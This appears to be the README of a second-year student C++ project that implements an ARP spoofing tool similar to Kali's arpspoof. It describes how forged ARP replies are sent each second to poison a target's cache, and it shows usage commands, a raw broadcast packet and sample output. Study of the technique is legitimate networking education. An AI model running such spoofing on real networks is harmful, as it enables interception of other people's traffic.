# NWP_myarpspoof_2018
Second year network project in C++ in which the goal is to create a program that spoofs ARP packets. The program first broadcast an ARP packet in order to retrieve the corresponding MAC address of the IPv4 address which belongs to the target. Then, the program send spoofed ARP reply packets every 1 second (using that MAC address). Those spoofed ARP packets basically lie to the victim by saying that MAC address resolves to an IPv4 provided as an argument. The behaviour and result of the program is almost identical to "arpspoof tool" that can be found in the Kali Linux Distribution.

USAGE : ./myARPspoof [source_ip] [dest_ip] [iface]

EXEMPLE : 

> ./myARPspoof 42.42.21.21 192.168.1.126 wlo1 ––printBroadcast

> ff ff ff ff ff ff aa bb ed 14 f7 ff 08 06 00 01 08 00 06 04 00 01 aa bb ed 14 f7 ff 2a f7 7f a2 f8 f1 f5 2f b4 ff c0 a8 01 24

> sudo ./myARPspoof 192.168.1.1 192.168.1.128 wlo1

> Found target’s MAC address: ‘C8:CD:72:65:34:21’
  Spoofed packet sent to ‘192.168.1.128’
  Spoofed packet sent to ‘192.168.1.128’
  Spoofed packet sent to ‘192.168.1.128’
  ...
